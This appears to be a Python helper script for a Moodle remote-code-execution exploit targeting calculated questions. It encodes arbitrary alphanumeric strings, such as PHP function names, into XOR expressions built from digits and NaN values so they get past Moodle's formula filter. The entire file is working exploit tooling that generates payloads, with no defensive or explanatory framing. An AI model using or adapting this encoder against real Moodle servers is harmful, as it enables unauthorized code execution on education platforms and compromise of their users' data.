#! /usr/bin/python
# Based on https://github.com/RedTeamPentesting/moodle-rce-calculatedquestions

import argparse
import re
import itertools

parser = argparse.ArgumentParser(description='Generate php code')
parser.add_argument('string', help='String to translate into compatible PHP code')
parser.add_argument('type', type=int, help='Type switch')

DEBUG = True

def debug_print(out_string):
    if DEBUG:
        print(out_string)

def get_set_bit_positions(n):
    positions = []
    position = 0
    
    while n > 0:
        if n & 1:
            positions.append(position)
        n >>= 1
        position += 1
    
    return positions

def find_xor_chars(target_bits_str, source_bits_str, max_chars, allowed_chars):
    target_bits_int = int(target_bits_str, 2)
    source_bits_int = int(source_bits_str, 2)
    x = target_bits_int ^ source_bits_int 

    allowed_codes = [ord(c) for c in allowed_chars]

    for num_chars in range(2, max_chars + 1):
        for chars_tuple in itertools.product(allowed_codes, repeat=num_chars):
            chars_xor = 0
            for code in chars_tuple:
                chars_xor ^= code
            if chars_xor == x:
                chars_list = [chr(code) for code in chars_tuple]
                return chars_list
    return None 

def merge_arrays(result, new_array):
    for i in range(len(new_array)):
        if i < len(result):
            result[i] += new_array[i]
        else:
            result.append(new_array[i])
    return result

def generate_numbers(string, switch):
    result = ""
    allowed_chars = [str(d) for d in range(10)] + ['-']
    digits = [str(d) for d in range(10)]

    for i in range(len(string)):
        if string[i] in digits:
            print(f"Digit flipping: acos(2) ^ ({string[i]} . 0+acos(2)) ^ acos(2)")
            if len(result) < 1:
                result = result + f"(acos(2) ^ ({string[i]} . 0+acos(2)) ^ acos(2))"
            else:
                result = result + " . " + f"(acos(2) ^ ({string[i]} . 0+acos(2)) ^ acos(2))"
            continue
            
        nan_char = 'N'.encode('ascii')[0]
        fun_char = string.encode('ascii')[i]
        target_bits = nan_char ^ fun_char
        debug_print("Target: {0:08b}".format(target_bits))

        bits_count = bin(target_bits).count('1')
        if bits_count > 5:
            print("Can't convert more than 5 bits")
            exit()

        target_bits_str = '{0:08b}'.format(fun_char)
        source_bits_str = '{0:08b}'.format(nan_char)
        max_digits = 6

        chars = find_xor_chars(target_bits_str, source_bits_str, max_digits, allowed_chars)
        if chars is None:
            print("Could not find XOR characters for symbol:", chr(fun_char))
            exit()
        debug_print("From [{0}] -> [{1}]: {2}".format(chr(nan_char), chr(fun_char), chars))
        print(chars)
        if len(result) < 1:
            result = result + generate_string(switch, chars)
        else:
            result = result + " . " + generate_string(switch, chars)

    return result

def generate_string(switch, chars_lists):
    number_parts = []
    for char in chars_lists:
        if switch == 1:
            if char in ['-']:
                number_parts.append(f"{char}1 . (0>1)")
            else:
                number_parts.append(f"{char} . (0>1)")
        elif switch == 2:
            if char in ['-']:
                number_parts.append(f"{char}1 . (acos(2) == acos(2))")
            else:
                number_parts.append(f"{char} . (acos(2) == acos(2))")
        elif switch == 3:
            if char in ['-']:
                number_parts.append(f"{char}1 . !1")
            else:
                number_parts.append(f"{char} . !1")
        else:
            if char in ['-']:
                number_parts.append(f"{char}1 . NULL")
            else:
                number_parts.append(f"{char} . NULL")
    xor_expression = ' ^ '.join(['acos(2) . 0+acos(2)'] + number_parts)
    xor_expression = f"({xor_expression})"
    return xor_expression

def main():
    string = args.string.strip()
    switchtype = args.type
    validation_regex = re.compile("^[_A-Za-z0-9]*$")
    if not validation_regex.match(string):
        print("String contains unsupported characters.")
        return

    res = generate_numbers(string, switchtype)
    print(res)

if __name__ == "__main__":
    args = parser.parse_args()
    main()
